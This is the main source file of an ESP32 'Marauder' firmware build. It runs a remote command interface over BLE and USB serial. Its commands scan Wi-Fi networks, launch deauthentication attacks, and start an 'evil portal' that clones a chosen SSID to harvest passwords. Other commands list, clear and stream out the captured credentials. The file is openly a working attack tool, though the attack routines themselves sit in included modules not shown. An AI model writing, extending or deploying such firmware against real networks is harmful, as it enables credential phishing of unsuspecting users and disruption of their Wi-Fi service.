/**
 * ESP32 Marauder - Evil Portal + Deauth
 * Main Main - BLE UART Remote Control
 */

#include "BleSerial.h"
#include "evil_portal.h"
#include "wifi_attack.h"
#include <Arduino.h>
#include <esp_wifi.h>

// Version
#define VERSION "1.2.0-BLE"

// Button for manual trigger
#define BTN_TRIGGER GPIO_NUM_0

// Global BLE Serial Instance
BleSerial SerialBT;

// Forward declarations
void process_command(String input);
void print_banner();
void print_help();

// --- WRAPPER FUNCTIONS FOR OUTPUT ---
// These ensure output goes to BOTH Serial (USB) and BLE (Remote)

void btPrint(const String &msg) {
  Serial.print(msg);
  if (SerialBT.connected()) {
    SerialBT.print(msg);
  }
}

void btPrintln(const String &msg) {
  Serial.println(msg);
  if (SerialBT.connected()) {
    SerialBT.println(msg);
  }
}

void btPrintf(const char *format, ...) {
  char buffer[256];
  va_list args;
  va_start(args, format);
  vsnprintf(buffer, sizeof(buffer), format, args);
  va_end(args);
  Serial.print(buffer);
  if (SerialBT.connected()) {
    SerialBT.print(buffer);
  }
}

// --- SETUP ---
void setup() {
  Serial.begin(115200);
  delay(1000);

  Serial.println("\n\n=================================");
  Serial.println("   ESP32 MARAUDER - BOOT");
  Serial.println("=================================\n");

  pinMode(BTN_TRIGGER, INPUT_PULLUP);

  // 1. Initialize WiFi/Attack Modules First
  // Critical: WiFi allocates radios. BLE comes later to share/coexist.
  Serial.println("[*] Init WiFi Attack Module...");
  wifi_attack_init();

  // Power MGMT: Disable WiFi power save to prevent radio sleep during AP mode
  // This is CRITICAL for Captive Portal responsiveness when BLE is active
  esp_wifi_set_ps(WIFI_PS_NONE);

  Serial.println("[*] Init Evil Portal Module...");
  evil_portal_init();

  // Give WiFi AP some time to stabilize before starting BLE radio
  delay(2000);

  // 2. Initialize BLE (NimBLE)
  // This essentially creates a "Serial over Air" service
  Serial.println("[BLE] Starting BLE UART Service...");
  SerialBT.begin("ESP32-Marauder");
  Serial.println("[BLE] OK! Name: ESP32-Marauder");
  Serial.println("[BLE] Status: Ready to connect");

  print_banner();
}

// --- LOOP ---
void loop() {
  // 1. Check for USB Serial Input
  if (Serial.available()) {
    String usbCmd = Serial.readStringUntil('\n');
    process_command(usbCmd);
  }

  // 2. Check for BLE Serial Input
  // BleSerial.read() acts like a stream. We buffer valid chars until newline.
  static String bleBuffer = "";
  while (SerialBT.available()) {
    char c = (char)SerialBT.read();
    if (c == '\n' || c == '\r') {
      if (bleBuffer.length() > 0) {
        btPrintf("[Remote] %s\n", bleBuffer.c_str());
        process_command(bleBuffer);
        bleBuffer = ""; // Reset buffer
      }
    } else {
      // Accumulate characters
      if (bleBuffer.length() < 128) {
        bleBuffer += c;
      }
    }
    // Prevent starvation of WiFi stack during burst reads
    vTaskDelay(1);
  }

  // 3. Periodic Tasks
  evil_portal_loop();

  // 4. Manual Trigger Button
  static bool lastBtnState = HIGH;
  bool btnState = digitalRead(BTN_TRIGGER);
  if (btnState == LOW && lastBtnState == HIGH) {
    delay(50);
    if (digitalRead(BTN_TRIGGER) == LOW) {
      btPrintln("\n[*] Status Report:");
      if (evil_portal_is_running())
        evil_portal_status();
      else
        btPrintln("System Idle.");
    }
  }
  lastBtnState = btnState;

  delay(10); // Yield to system
}

// --- COMMAND PROCESSOR ---
void process_command(String input) {
  input.trim();
  if (input.length() == 0)
    return;

  int spaceIdx = input.indexOf(' ');
  String cmd = (spaceIdx > 0) ? input.substring(0, spaceIdx) : input;
  String args = (spaceIdx > 0) ? input.substring(spaceIdx + 1) : "";

  cmd.toLowerCase();
  args.trim();

  // === System ===
  if (cmd == "help" || cmd == "?") {
    print_help();
  } else if (cmd == "reboot") {
    btPrintln("[!] Rebooting...");
    delay(500);
    ESP.restart();
  }

  // === WiFi Scan ===
  else if (cmd == "scanap") {
    wifi_scan_start();
  } else if (cmd == "listap") {
    wifi_list_aps();
  } else if (cmd == "select") {
    if (args.length() > 0)
      wifi_select_ap(args.toInt());
    else
      btPrintln("[!] Usage: select <id>");
  }

  // === Attacks ===
  else if (cmd == "deauth") {
    wifi_deauth_start();
  } else if (cmd == "stop") {
    wifi_deauth_stop();
    evil_portal_stop();
  }

  // === Evil Portal ===
  else if (cmd == "evilportal" || cmd == "ep") {
    if (args.startsWith("start")) {
      // Extract SSID if provided, else use selected
      int firstSpace = args.indexOf(' ');
      if (firstSpace > 0) {
        String ssid = args.substring(firstSpace + 1);
        // Remove quotes
        ssid.replace("\"", "");
        evil_portal_start(ssid.c_str());
      } else {
        APInfo *ap = wifi_get_selected_ap();
        if (ap)
          evil_portal_start(ap->ssid.c_str());
        else
          btPrintln("[!] Error: Select AP or provide Name");
      }
    } else if (args == "stop")
      evil_portal_stop();
    else if (args == "status")
      evil_portal_status();
    else if (args == "creds")
      evil_portal_list_creds();
    else if (args == "clear") {
      if (SerialBT.connected() && !SerialBT.isAuthorized()) {
        btPrintln(
            "[!] BLE link not authorized. Pairing required to clear creds.");
      } else {
        evil_portal_clear_creds();
      }
    } else if (args == "export") {
      // Stream captured credentials over BLE if connected, else to USB serial
      if (SerialBT.connected()) {
        if (!SerialBT.isAuthorized()) {
          btPrintln(
              "[!] BLE link not authorized. Pairing required to export creds.");
        } else {
          btPrintln("[Portal] Exportando credenciais via BLE...");
          evil_portal_export_creds(SerialBT);
          btPrintln("[Portal] Export concluido.");
        }
      } else {
        btPrintln("[!] BLE nao conectado. Enviando para USB.");
        evil_portal_export_creds(Serial);
      }
    } else
      btPrintln("[!] Unknown ep command");
  }

  // === Combo Attack ===
  else if (cmd == "attack") {
    APInfo *ap = wifi_get_selected_ap();
    if (ap) {
      btPrintf("[*] Launching Attack on: %s\n", ap->ssid.c_str());
      evil_portal_start(ap->ssid.c_str());
      // Note: Deauth might need channel hop, handled safely?
    } else {
      btPrintln("[!] Select AP first.");
    }
  }

  else {
    btPrintln("[!] Unknown Command");
  }

  btPrint("> ");
}

void print_help() {
  btPrintln("\n=== MARAUDER REMOTE ===");
  btPrintln("  scanap / listap / select <id>");
  btPrintln("  deauth / stop");
  btPrintln("  evilportal start <ssid>");
  btPrintln("  evilportal creds / clear");
  btPrintln("  reboot");
  btPrintln("=======================\n");
}

void print_banner() {
  btPrintln("\nESP32 MARAUDER BLE READY");
  btPrintln("Use Serial Bluetooth Terminal");
  // Display pairing instructions and passkey on USB serial for convenience
  char pkbuf[64];
  snprintf(pkbuf, sizeof(pkbuf), "Pairing PIN: %06d", BLE_PASSKEY);
  Serial.println(pkbuf);
  btPrintln(String("Pairing PIN: ") + String(BLE_PASSKEY));
  btPrint("> ");
}
